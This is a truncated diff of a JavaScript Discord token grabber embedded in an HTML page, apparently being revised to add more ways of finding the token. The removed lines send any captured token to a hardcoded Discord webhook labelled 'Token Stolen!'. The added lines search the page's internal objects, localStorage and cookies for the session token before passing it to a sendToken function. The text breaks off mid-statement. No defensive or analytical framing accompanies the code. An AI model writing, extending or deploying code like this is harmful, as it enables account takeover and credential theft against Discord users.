@@ -5,32 +5,33 @@
   setTimeout(() => {
     let token = null;
     
-    // Try to grab the token from Discord's internal memory
+    // Try multiple methods to find the token
     try {
-      // Modern Discord versions
+      // Method 1: Standard internal object
       token = window._discordHeaders?.Authorization || 
               window.z?.[0]?.c?.exports?.default?.instance?.getToken();
     } catch (e) {}
 
-    // Fallback: Check cookies (less common now but still possible)
+    // Method 2: Local Storage
+    if (!token) {
+      try {
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key.includes('token')) {
+            token = localStorage.getItem(key);
+            break;
+          }
+        }
+      } catch (e) {}
+    }
+
+    // Method 3: Cookies
     if (!token) {
       const match = document.cookie.match(/token=([^;]+)/);
       if (match) token = match[1];
     }
 
     if (token) {
-      // Send to your Discord Webhook
-      fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
-        })
-      }).then(() => {
-        console.log("Token sent.");
-      }).catch(err => console.error("Send failed:", err));
-    }
-  }, 3000); // Wait 3 seconds for Discord to load fully
-</script>
-</body>
-</html>
+      sendToken(token);
+    } else {
+      console.log("No token found. Logging window
